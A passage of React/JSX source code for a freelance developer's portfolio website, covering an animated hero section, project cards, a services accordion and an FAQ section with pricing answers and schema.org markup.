  const vw = typeof window !== "undefined" ? window.innerWidth : 0;
  const vh = typeof window !== "undefined" ? window.innerHeight : 0;
  const lerp = (a, b, t) => a + (b - a) * t;
  const videoBox = !slot
    ? null
    : pinDone
      // Pin released: hold fullscreen and scroll away with the page 1:1.
      ? { top: PIN_LENGTH - scrollY, left: 0, width: vw, height: vh, radius: 0 }
      : {
          top: lerp(slot.top, 0, progress),
          left: lerp(slot.left, 0, progress),
          width: lerp(slot.w, vw, progress),
          height: lerp(slot.h, vh, progress),
          radius: lerp(10, 0, progress),
        };
  const hasVideo = Boolean(videoBox);
  useEffect(() => {
    if (!hasVideo || !heroVideoRef.current) return;
    const video = heroVideoRef.current;
    const startPlayback = () => {
      video.muted = true;
      video.play().catch(() => {});
    };
    if (video.readyState >= 2) startPlayback();
    else video.addEventListener("loadeddata", startPlayback, { once: true });
    return () => video.removeEventListener("loadeddata", startPlayback);
  }, [hasVideo]);
  useEffect(() => { const t = setTimeout(() => setVis(true), 150); return () => clearTimeout(t); }, []);

  return (
    // Outer wrapper is taller than the viewport by PIN_LENGTH â€” that extra
    // height is the scroll distance the pin consumes. No overflow:hidden here,
    // it would break position:sticky on the inner element.
    <section id="hero" style={{
      position: "relative",
      height: isMobile ? "auto" : `calc(88vh + ${PIN_LENGTH}px)`,
    }}>
    <div style={{
      position: isMobile ? "relative" : "sticky", top: 0,
      minHeight: isMobile ? "auto" : "88vh",
      display: "flex", flexDirection: "column",
      justifyContent: "space-between",
      padding: "clamp(96px,8vh,112px) clamp(20px,3.5vw,60px) 56px",
      overflow: "hidden",
    }}>
      {/* Invisible slot â€” marks where the docked video sits in the hero layout.
          Measured once (and on resize) so the fixed video knows its home. */}
      {!isMobile && (
        <div
          ref={videoSlotRef}
          aria-hidden="true"
          style={{
            position: "absolute", top: "clamp(159px,9vw,100px)", right: "clamp(20px,5vw,60px)",
            width: "clamp(160px,13.5vw,230px)", height: "clamp(85px,7.2vw,125px)",
            pointerEvents: "none", visibility: "hidden",
          }}
        />
      )}

      {/* Project preview video â€” geometry is driven straight off scroll
          position, with no CSS transition, so it tracks the scrub exactly. */}
      {!isMobile && videoBox && (
        <div
          onMouseEnter={() => setVideoHov(true)}
          onMouseLeave={() => setVideoHov(false)}
          style={{
            position: "fixed",
            top: videoBox.top, left: videoBox.left,
            width: videoBox.width, height: videoBox.height,
            borderRadius: videoBox.radius, overflow: "hidden",
            border: progress > 0.02 ? "none" : "1px solid rgba(255,255,255,0.28)",
            zIndex: progress > 0 ? 20 : 2,
            opacity: vis ? 1 : 0,
            willChange: "top, left, width, height",
            transition: "opacity 1s cubic-bezier(0.16,1,0.3,1) 0.3s",
          }}
        >
          <video
            ref={heroVideoRef}
            src="https://res.cloudinary.com/jj8ju519/video/upload/v1791715047/Hero_Section.mp4"
            autoPlay loop playsInline muted={videoMuted} preload="metadata"
            poster="/new%20projects.jpg"
            style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
          />
          <button
            onClick={() => setVideoMuted(m => !m)}
            aria-label={videoMuted ? "Unmute video" : "Mute video"}
            style={{
              position: "absolute", top: "50%", left: "50%", transform: "translate(-50%,-50%)",
              width: 34, height: 34, borderRadius: "50%",
              background: "rgba(2,6,10,0.65)", border: "1px solid rgba(255,255,255,0.4)",
              display: "flex", alignItems: "center", justifyContent: "center",
              color: "#eef2f6", cursor: "pointer",
              opacity: videoHov ? 1 : 0, pointerEvents: videoHov ? "auto" : "none",
              transition: "opacity 0.25s ease",
            }}
          >
            {videoMuted ? (
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M11 5 6 9H2v6h4l5 4V5z" strokeLinejoin="round" />
                <line x1="23" y1="9" x2="17" y2="15" strokeLinecap="round" />
                <line x1="17" y1="9" x2="23" y2="15" strokeLinecap="round" />
              </svg>
            ) : (
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M11 5 6 9H2v6h4l5 4V5z" strokeLinejoin="round" />
                <path d="M19.07 4.93a10 10 0 010 14.14M15.54 8.46a5 5 0 010 7.07" strokeLinecap="round" />
              </svg>
            )}
          </button>
        </div>
      )}

      {/* Profile photo â€” sits directly left of the video, same top, small gap
          between them. Tweak the numbers freely in DevTools. */}
      {!isMobile && showProfilePhoto && (
        <div style={{
          position: "absolute",
          // photo bottom lines up with the headline baseline (the "." of SYSTEMS.)
          top: "calc(159px + 1.88 * clamp(44px,10vw,124px) - clamp(130px,13vw,180px))",
          left: "calc(100% - clamp(20px,5vw,60px) - 480px)",
          width: "clamp(130px,13vw,180px)", height: "clamp(130px,13vw,180px)",
          zIndex: 2,
          opacity: vis ? 1 : 0, transform: vis ? "none" : "translateY(-20px)",
          transition: "all 1s cubic-bezier(0.16,1,0.3,1) 0.4s",
        }}>
          <img
            src={aqibPhoto}
            alt="Aqib Faraz"
            style={{
              width: "100%", height: "100%", display: "block",
              objectFit: "cover", objectPosition: "top center",
            }}
          />
          {/* light black overlay */}
          <div style={{
            position: "absolute", inset: 0,
            background: "rgba(0,0,0,0.3)", pointerEvents: "none",
          }} />
        </div>
      )}

      {/* Top block: badge + headline + role. No interactive content in here â€”
          pointerEvents:none stops its empty right-hand space from blocking the
          video/photo/button that sit over it. maxWidth is wide enough for
          "Data. Systems." to stay on one line but capped so it doesn't reach
          under the video/photo column on the right. */}
      <div style={{
        position: "relative", zIndex: 2, pointerEvents: "none",
        maxWidth: isNarrowDesktop ? "72vw" : "min(86vw, 1440px)",
        opacity: vis ? 1 : 0,
        transform: vis ? "none" : "translateY(44px)",
        transition: "all 1.1s cubic-bezier(0.16,1,0.3,1)",
      }}>
        {/* Badge */}
        <div style={{
          display: "flex", alignItems: "center", gap: 14, marginBottom: 28,
          opacity: vis ? 1 : 0, transition: "opacity 0.9s ease 0.25s",
        }}>
          <span style={{ width: 36, height: 1, background: "rgba(255,255,255,0.4)", display: "inline-block", flexShrink: 0 }} />
          <span style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 600,
            fontSize: "clamp(10px,1.1vw,12px)",
            letterSpacing: "0.14em", color: "rgba(255,255,255,0.55)", textTransform: "uppercase",
          }}>Remote - Available Now</span>
        </div>

        {/* Headline */}
        <h1 style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif",
          fontSize: "clamp(44px,11vw,176px)", fontWeight: 800,
          lineHeight: 0.9, color: "#eef2f6",
          margin: "0 0 clamp(18px,2vw,28px)", letterSpacing: "-0.035em",
          textTransform: "uppercase",
        }}>
          <span style={{
            position: "absolute",
            width: 1,
            height: 1,
            padding: 0,
            margin: -1,
            overflow: "hidden",
            clip: "rect(0, 0, 0, 0)",
            whiteSpace: "nowrap",
            border: 0,
          }}>Aqib Faraz - Software, Data &amp; Systems Developer</span>
          <span style={{
            display: "block",
            opacity: vis ? 1 : 0, transform: vis ? "none" : "translateX(-28px)",
            transition: "all 0.95s cubic-bezier(0.16,1,0.3,1) 0.1s",
          }} aria-hidden="true">Software.</span>
          <span style={{
            display: "block",
            opacity: vis ? 1 : 0, transform: vis ? "none" : "translateX(-28px)",
            transition: "all 0.95s cubic-bezier(0.16,1,0.3,1) 0.22s",
          }} aria-hidden="true">Data. Systems.</span>
        </h1>

        {/* Rotating role */}
        <div style={{
          position: "relative", top: -6,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 600,
          fontSize: "clamp(13px,1.6vw,18px)",
          color: "rgba(255,255,255,0.5)",
          height: 28, whiteSpace: "nowrap", overflow: "hidden",
          opacity: vis ? 1 : 0, transition: "opacity 0.9s ease 0.4s",
        }}>
          {typed}
        </div>
      </div>

      {isMobile && (
        <div style={{
          position: "relative", zIndex: 2, width: "100%", height: "clamp(190px,48vw,310px)",
          margin: "clamp(18px,4vw,30px) 0 clamp(20px,5vw,36px)",
          overflow: "hidden", borderRadius: 4, background: "#02060a",
        }}>
          <video
            src="https://res.cloudinary.com/jj8ju519/video/upload/v1791715047/Hero_Section.mp4"
            autoPlay loop playsInline muted
            style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
          />
        </div>
      )}

      {/* Bottom block: trust row (left) + paragraph & CTAs (right) */}
      <div style={{
        position: "relative", top: -8, zIndex: 2,
        display: "flex", alignItems: "flex-end", justifyContent: "space-between",
        flexWrap: "wrap", gap: "36px 40px",
        opacity: vis ? 1 : 0,
        transform: vis ? "none" : "translateY(30px)",
        transition: "all 1.1s cubic-bezier(0.16,1,0.3,1) 0.25s",
      }}>
        {/* Trust row */}
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <div style={{ display: "flex" }}>
            {["/Feedbackimg1.webp", "/feedbackimg2.webp"].map((src, i) => (
              <span key={src} style={{
                width: 42, height: 42, borderRadius: "50%", overflow: "hidden",
                display: "block", background: "transparent",
                marginLeft: i === 0 ? 0 : -12,
              }}>
                <img src={src} alt="Client feedback" style={{
                  width: "100%", height: "100%", display: "block",
                  objectFit: "cover", transform: "scale(1.38)",
                }} />
              </span>
            ))}
          </div>
          <div>
            <div style={{ display: "flex", gap: 2, marginBottom: 4 }}>
              {Array.from({ length: 5 }).map((_, i) => (
                <svg key={i} width="16" height="16" viewBox="0 0 24 24" fill="#ff3b30">
                  <path d="M12 .587l3.668 7.568 8.332 1.151-6.064 5.828 1.48 8.279L12 19.771l-7.416 3.642 1.48-8.279L0 9.306l8.332-1.151z" />
                </svg>
              ))}
            </div>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 500,
              fontSize: "clamp(11px,1.1vw,13px)",
              letterSpacing: "0.01em", color: "rgba(255,255,255,0.5)",
            }}>Trusted by 150+ clients</div>
          </div>
        </div>

        {/* Paragraph + CTAs */}
        <div style={{ maxWidth: 480 }}>
          <p style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(13px,1.3vw,16px)", lineHeight: 1.8,
            color: "rgba(255,255,255,0.45)",
            margin: "0 0 22px",
          }}>
            I build web platforms, automation pipelines, and full-stack products
            solving real business problems with clean, reliable code. Remote-first,
            working with clients across the USA &amp; Europe.
          </p>
          <div style={{ display: "flex", alignItems: "center", gap: 16, flexWrap: "wrap" }}>
            <a href="#work" style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
              fontSize: "clamp(12px,1.2vw,13px)", letterSpacing: "0.02em",
              textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
              padding: "16px clamp(28px,3vw,38px)", textDecoration: "none",
              borderRadius: 999, transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >View Portfolio</a>
            <a href="#work" aria-label="Scroll to work" style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center",
              width: 52, height: 52, borderRadius: "50%",
              border: "1px solid rgba(255,255,255,0.22)", color: "#eef2f6",
              transition: "all 0.25s ease", flexShrink: 0,
            }}
              onMouseEnter={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
              onMouseLeave={e => { e.currentTarget.style.background = "transparent"; e.currentTarget.style.color = "#eef2f6"; }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </a>
          </div>
        </div>
      </div>

      <div style={{
        position: "absolute", bottom: 0, left: 0, right: 0, height: 100,
        background: "linear-gradient(to top, #02060a, transparent)",
        zIndex: 1, pointerEvents: "none",
      }} />
      </div>
    </section>
  );
}


// â”€â”€â”€ WORK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Cover image at rest; the clip fades in and plays on hover. Video only starts
// loading once hovered, so three clips don't all download on page load.
function WorkCard({ p, i, inView }) {
  const [hov, setHov] = useState(false);
  const videoRef = useRef(null);

  useEffect(() => {
    const v = videoRef.current;
    if (!v) return;
    if (hov) { v.play().catch(() => {}); }
    else { v.pause(); v.currentTime = 0; }
  }, [hov]);

  return (
    <a
      href={p.href || "#"}
      target={p.href && p.href !== "#" ? "_blank" : undefined}
      rel="noreferrer"
      onMouseEnter={() => setHov(true)}
      onMouseLeave={() => setHov(false)}
      style={{
        // No fixed ratio â€” the cover image sets the height, so each card ends
        // at its own natural size and the columns stagger by themselves.
        position: "relative",
        overflow: "hidden", background: "#0c0f12",
        display: "block", textDecoration: "none",
        // keep a card from being split across two columns
        breakInside: "avoid", WebkitColumnBreakInside: "avoid",
        marginBottom: "clamp(8px,1vw,14px)",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(24px)",
        transition: `opacity 0.7s ease ${i * 0.08}s, transform 0.7s ease ${i * 0.08}s`,
      }}
    >
      {/* In normal flow â€” this image is what gives the card its height */}
      <img
        src={p.image}
        alt={p.title}
        style={{
          display: "block", width: "100%", height: "auto",
          transform: hov ? "scale(1.04)" : "scale(1)",
          opacity: hov ? 0 : 1,
          transition: "transform 0.6s ease, opacity 0.4s ease",
        }}
      />
      {hov && (
        <video
          ref={videoRef}
          src={p.video}
          muted loop playsInline preload="none"
          style={{
            position: "absolute", inset: 0, width: "100%", height: "100%",
            objectFit: "cover",
          }}
        />
      )}
      <div style={{
        position: "absolute", inset: 0,
        background: "linear-gradient(to top, rgba(0,0,0,0.75) 0%, rgba(0,0,0,0.1) 45%, transparent 70%)",
      }} />
      <div style={{
        position: "absolute", left: 20, right: 20, bottom: 18,
        display: "flex", alignItems: "flex-end", justifyContent: "space-between",
        gap: 12,
      }}>
        <div style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 500,
          fontSize: "clamp(18px,2vw,26px)", color: "#eef2f6", letterSpacing: "0.01em",
        }}>{p.title}</div>
        <div style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(11px,1vw,14px)", color: "rgba(255,255,255,0.6)",
          textAlign: "right", lineHeight: 1.35,
        }}>
          {p.category}<br />{p.type}
        </div>
      </div>
    </a>
  );
}

// â”€â”€â”€ SERVICES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Accordion list. `items` / `image` per service are still to be filled in â€”
// a row with no items just shows the CTA when opened.
const SERVICES_LIST = [
  {
    id: "01", title: "Website development", href: "#become-client",
    video: "/web%20development.mp4",
    items: [
      { label: "Angular Website Development" },
      { label: "Laravel Website Development" },
      { label: "Node.js Website Development" },
      { label: "React Website Development" },
      { label: "Vue.js Website Development" },
      { label: "WordPress Website Development" },
    ],
  },
  {
    id: "02", title: "Branding and design", href: "#become-client",
    video: "/branding-and-design.mp4",
    items: [
      { label: "Logo & Brand Guidelines" },
      { label: "Landing Page Design" },
      { label: "Online Store Design" },
      { label: "Custom Website Design" },
      { label: "UI/UX Website Design" },
    ],
  },
  {
    id: "03", title: "CRM system", href: "#become-client",
    image: "/service-crm.webp",
    items: [
      { label: "Automotive Industry" },
      { label: "Real Estate Agency" },
      { label: "Outsourcing Company" },
      { label: "Building company" },
      { label: "Client Database Management" },
      { label: "Manufacturing" },
      { label: "Online Store" },
      { label: "Cafes & Restaurants" },
      { label: "Call Center" },
      { label: "Delivery Service" },
      { label: "Landing Page" },
      { label: "Logistics Company" },
      { label: "Store" },
    ],
  },
  {
    id: "04", title: "E-commerce", href: "#become-client",
    image: "/E-commer.webp",
    items: [
      { label: "E-commerce Website Development" },
      { label: "OpenCart Website Development" },
      { label: "Shopify Website Development" },
    ],
  },
  { id: "05", title: "Landing page", items: [], video: "/Landingpage.mp4", href: "#become-client" },
  { id: "06", title: "Website support", items: [], video: "/Sitesupport.mp4", href: "#become-client" },
  { id: "07", title: "Redesign", items: [], image: "/redesign.webp", href: "#become-client" },
  {
    id: "08", title: "Application development", href: "#become-client",
    image: "/service-app-dev-1.webp",
    items: [
      { label: "Android Apps" },
      { label: "iOS Apps" },
    ],
  },
  { id: "09", title: "Search engine optimisation", items: [], video: "/SEO.mp4", href: "#become-client" },
];

function ServiceRow({ s, open, onToggle }) {
  const [hov, setHov] = useState(false);
  return (
    <div style={{ borderTop: "1px solid rgba(255,255,255,0.14)" }}>
      <button
        onClick={onToggle}
        onMouseEnter={() => setHov(true)}
        onMouseLeave={() => setHov(false)}
        aria-expanded={open}
        style={{
          width: "100%", border: "none", cursor: "pointer",
          display: "flex", alignItems: "center", gap: "clamp(16px,2.5vw,40px)",
          padding: "clamp(20px,2.6vw,36px) 0",
          textAlign: "left",
          color: open || hov ? "#eef2f6" : "rgba(255,255,255,0.75)",
          background: "transparent",
          transition: "color 0.25s ease",
        }}
      >
        {/* arrow: diagonal when closed, straight down when open */}
        {/* points straight down when open â€” and on hover, so it reads as clickable */}
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor"
          strokeWidth="1.4" style={{
            flexShrink: 0,
            transform: open || hov ? "rotate(-45deg)" : "none",
            transition: "transform 0.35s cubic-bezier(0.25,1,0.5,1)",
          }}>
          <path d="M6 6l12 12M18 8v10H8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
        <span style={{
          flex: 1,
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(22px,3vw,42px)", letterSpacing: "-0.01em",
        }}>{s.title}</span>
        <span style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
          fontSize: "clamp(14px,1.4vw,20px)", color: "rgba(255,255,255,0.75)",
        }}>{s.id}</span>
        {/* tick marks; the leading one grows into a solid bar on hover/open */}
        <span style={{ display: "flex", alignItems: "center", gap: 5, flexShrink: 0 }} aria-hidden="true">
          <span style={{
            width: 1,
            height: open || hov ? "clamp(30px,3.2vw,48px)" : "clamp(12px,1.3vw,18px)",
            background: open || hov ? "#eef2f6" : "rgba(255,255,255,0.45)",
            display: "block", transition: "height 0.25s ease, background 0.25s ease",
          }} />
          {Array.from({ length: 8 }).map((_, i) => (
            <span key={i} style={{
              width: 1, height: "clamp(12px,1.3vw,18px)",
              background: "rgba(255,255,255,0.45)", display: "block",
            }} />
          ))}
        </span>
      </button>

      {open && (
        <div style={{
          display: "flex", flexWrap: "wrap", gap: "clamp(24px,3vw,56px)",
          padding: "0 0 clamp(32px,4vw,56px)",
        }}>
          {/* items at the top, CTA pinned to the bottom so it lines up with the
              bottom edge of the media on the right */}
          <div style={{
            flex: "1 1 420px", minWidth: 280,
            display: "flex", flexDirection: "column", justifyContent: "space-between",
          }}>
            {s.items.length > 0 && (
              <div style={{
                display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(200px,1fr))",
                gap: "clamp(12px,1.4vw,20px) clamp(24px,3vw,48px)",
              }}>
                {s.items.map(it => (
                  <a key={it.label} href={it.href || s.href} style={{
                    display: "flex", alignItems: "flex-start", gap: 10,
                    fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
                    fontSize: "clamp(14px,1.3vw,18px)", lineHeight: 1.45,
                    color: "rgba(255,255,255,0.8)", textDecoration: "none",
                    transition: "opacity 0.2s",
                  }}
                    onMouseEnter={e => e.currentTarget.style.opacity = "0.6"}
                    onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                  >
                    <span style={{
                      width: 5, height: 5, borderRadius: "50%", marginTop: 8,
                      border: "1px solid rgba(255,255,255,0.5)", flexShrink: 0,
                    }} />
                    {it.label}
                  </a>
                ))}
              </div>
            )}
            {/* marginTop:auto keeps the CTA at the bottom even when a service
                has no items above it */}
            <div style={{ display: "flex", alignItems: "center", gap: 12, marginTop: "auto", paddingTop: "clamp(28px,3.5vw,52px)" }}>
              <a href={s.href} style={{
                fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                fontSize: "clamp(11px,1.1vw,13px)", letterSpacing: "0.04em",
                textTransform: "uppercase", background: "#eef2f6", color: "#02060a",
                borderRadius: 999, padding: "clamp(14px,1.4vw,20px) clamp(24px,2.4vw,34px)",
                textDecoration: "none", transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >View Service Details</a>
              <a href={s.href} aria-label={`${s.title} details`} style={{
                display: "inline-flex", alignItems: "center", justifyContent: "center",
                width: "clamp(44px,3.6vw,56px)", height: "clamp(44px,3.6vw,56px)",
                borderRadius: "50%", background: "#eef2f6", color: "#02060a", flexShrink: 0,
                transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                  <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </a>
            </div>
          </div>

          {s.video ? (
            <video src={s.video} autoPlay muted loop playsInline style={{
              flex: "1 1 380px", maxWidth: "min(100%, 620px)",
              height: "clamp(220px,26vw,380px)", objectFit: "cover", display: "block",
            }} />
          ) : s.image ? (
            <img src={s.image} alt={s.title} style={{
              flex: "1 1 380px", maxWidth: "min(100%, 620px)",
              height: "clamp(220px,26vw,380px)", objectFit: "cover", display: "block",
            }} />
          ) : null}
        </div>
      )}
    </div>
  );
}

// â”€â”€â”€ FAQ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Answers are placeholders â€” send the real copy and I'll drop it in.
const FAQS = [
  { q: "What is the price for development?", a: "It depends on what you need built. A business or portfolio website usually starts at $ 200, an online store at $ 400 and a CRM or custom web application at $ 600. Mobile apps start at $ 600. These are starting points, since every project has its own requirements. Once I understand what you want, I send a fixed quote with everything itemized, so there are no surprises later." },
  { q: "What terms do I offer?", a: "Before any work starts, we agree on the scope, deliverables and timeline in writing. Payment is split into milestones, normally 25% upfront and the rest as the work progresses or on delivery. You get the full source code and complete ownership once the final payment is made. Each project includes [2] rounds of revisions, and I am happy to sign an NDA if you need one. I also send regular updates, so you always know where things stand." },
  { q: "What am I offering for website promotion?", a: "I set up your website so search engines can find and understand it. That covers page speed, clean code, mobile friendliness, meta tags, schema markup and keyword research for your pages. I also connect Google Search Console and Google Analytics so you can see where your visitors come from. On top of that, I make sure links to your site look good when shared on social media, and I design pages so visitors are guided toward contacting you or buying." },
  { q: "How do I estimate the cost?", a: "The estimate depends on a few things: how many pages or screens you need, which features are involved (payments, user accounts, dashboards, automation, third-party integrations), how custom the design is, and how quickly you need it done. Send me your requirements and I will reply with a detailed estimate, usually within 24 hours." },
  { q: "What services does my support service provide?", a: "After your site goes live, I stay available to fix bugs, apply security updates, take backups, keep an eye on performance, and make content or feature changes when you need them. I can also help with hosting and domain issues. Every project includes [30] days of free support after launch. After that, you can choose a monthly maintenance plan starting at $100  per month, or just contact me whenever something comes up." },
  { q: "What is the difference between a custom solution and a ready-made solution?", a: "A ready-made solution, such as a template or a pre-built platform, is cheaper and faster to launch, but you are limited to what it offers. A custom solution is built around your business, so the design is unique and the features match how you actually work. It costs more upfront and takes longer, but it grows with you and does not hold you back later.", table: [
    ["Feature", "Custom Solution", "Ready-Made Solution"],
    ["Cost", "Higher upfront", "Lower upfront"],
    ["Design", "Unique and built around your brand", "Template based"],
    ["Features", "Exactly what your business needs", "Limited to what the template offers"],
    ["Scalability", "Grows with your business", "Can become restrictive"],
    ["Launch time", "Takes longer", "Much faster"],
    ["Best for", "Growing businesses and unique workflows", "Startups and tight budgets"],
  ], closing: "Not sure which one suits you? Tell me about your project and I will give you an honest recommendation." },
  { q: "How is the website development process conducted?", a: "Every project follows the same steps, so you always know what comes next.", steps: [
    "Discovery: We talk about your goals, your audience and what you need.",
    "Proposal: You receive the scope, timeline and quote.",
    "Design: I prepare the layout and visual direction for your approval.",
    "Development: I build the site with the technology that fits best, such as React, Node.js or Shopify, and share progress along the way.",
    "Testing: I check it on different browsers and devices, and test speed and security.",
    "Launch: I handle deployment, domain and hosting setup, and basic SEO.",
    "Support: I stay available after launch for fixes and updates.",
  ] },
];

const FAQ_SCHEMA = {
  "@context": "https://schema.org",
  "@type": "FAQPage",
  mainEntity: FAQS.map(item => ({
    "@type": "Question",
    name: item.q,
    acceptedAnswer: {
      "@type": "Answer",
      text: [
        item.a,
        item.table && item.table.slice(1).map(row => `${row[0]}: ${row[1]} | ${row[2]}`).join("; "),
        item.closing,
        item.steps && item.steps.join(" "),
      ].filter(Boolean).join(" "),
    },
  })),
};

function FAQAccordion({ item, index, open, onToggle }) {
  const [hov, setHov] = useState(false);
  const answerId = `faq-answer-${index}`;
  return (
    <div style={{ borderTop: "1px solid rgba(255,255,255,0.14)" }}>
      <button
        type="button"
        onClick={onToggle}
        onMouseEnter={() => setHov(true)}
        onMouseLeave={() => setHov(false)}
        aria-expanded={open}
        aria-controls={answerId}
        style={{
          width: "100%", background: "none", border: "none", cursor: "pointer",
          display: "flex", alignItems: "center", justifyContent: "space-between",
          gap: 20, padding: "clamp(18px,2.2vw,30px) 0", textAlign: "left",
          color: open || hov ? "#eef2f6" : "rgba(255,255,255,0.85)",
          transition: "color 0.25s ease",
        }}
      >
        <span style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
          fontSize: "clamp(14px,1.3vw,19px)", letterSpacing: "0.01em",
        }}>{item.q}</span>
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor"
          strokeWidth="1.4" style={{
            flexShrink: 0,
            transform: open || hov ? "rotate(-45deg)" : "none",
            transition: "transform 0.35s cubic-bezier(0.25,1,0.5,1)",
          }}>
          <path d="M6 6l12 12M18 8v10H8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      </button>
      <div id={answerId} role="region" aria-hidden={!open} style={{
        display: "grid", gridTemplateRows: open ? "1fr" : "0fr",
        opacity: open ? 1 : 0,
        transition: "grid-template-rows 0.4s ease, opacity 0.25s ease",
      }}>
        <div style={{ overflow: "hidden" }}>
          <div style={{
            padding: "0 0 clamp(20px,2.4vw,32px)", maxWidth: 840,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(14px,1.25vw,17px)", lineHeight: 1.7,
            color: "rgba(255,255,255,0.6)",
          }}>
            <p style={{ margin: 0 }}>{item.a}</p>
            {item.table && <div style={{ overflowX: "auto", marginTop: 24 }}>
              <table style={{ width: "100%", minWidth: 620, borderCollapse: "collapse", textAlign: "left" }}>
                <thead><tr>{item.table[0].map(cell => <th key={cell} style={{ padding: "12px 14px", color: "#eef2f6", borderBottom: "1px solid rgba(255,255,255,0.2)", fontWeight: 700 }}>{cell}</th>)}</tr></thead>
                <tbody>{item.table.slice(1).map(row => <tr key={row[0]}>{row.map(cell => <td key={cell} style={{ padding: "12px 14px", borderBottom: "1px solid rgba(255,255,255,0.1)", verticalAlign: "top" }}>{cell}</td>)}</tr>)}</tbody>
              </table>
            </div>}
            {item.closing && <p style={{ margin: "24px 0 0" }}>{item.closing}</p>}
            {item.steps && <ol style={{ margin: "18px 0 0 22px", padding: 0 }}>{item.steps.map(step => <li key={step} style={{ paddingLeft: 6, marginBottom: 8 }}>{step}</li>)}</ol>}
          </div>
        </div>
      </div>
    </div>
  );
}

function Faq({ onOpenContact }) {
  const [ref, inView] = useInView();
  const [open, setOpen] = useState(null);
  return (
    <section id="faq" style={{ padding: "clamp(60px,8vw,120px) clamp(20px,5vw,60px)" }}>
      <div ref={ref} style={{
        display: "flex", flexWrap: "wrap", gap: "clamp(24px,3vw,56px)",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        {/* Left card */}
        <div style={{
          flex: "1 1 300px", minWidth: 280, background: "#0c0f12",
          padding: "clamp(28px,3.4vw,48px)",
          display: "flex", flexDirection: "column", justifyContent: "space-between",
          gap: "clamp(48px,7vw,120px)",
        }}>
          <div>
            <div style={{
              width: "clamp(64px,6vw,96px)", height: "clamp(64px,6vw,96px)",
              borderRadius: "50%", background: "#eef2f6", color: "#02060a",
              display: "flex", alignItems: "center", justifyContent: "center",
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 800,
              fontSize: "clamp(20px,2vw,30px)", letterSpacing: "-0.02em",
              marginBottom: "clamp(24px,3vw,44px)",
            }}>AF.</div>
            <div style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
              fontSize: "clamp(26px,3vw,44px)", letterSpacing: "-0.01em",
              color: "#eef2f6",
            }}>Let&rsquo;s talk</div>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <button type="button" onClick={() => onOpenContact("left")} style={{
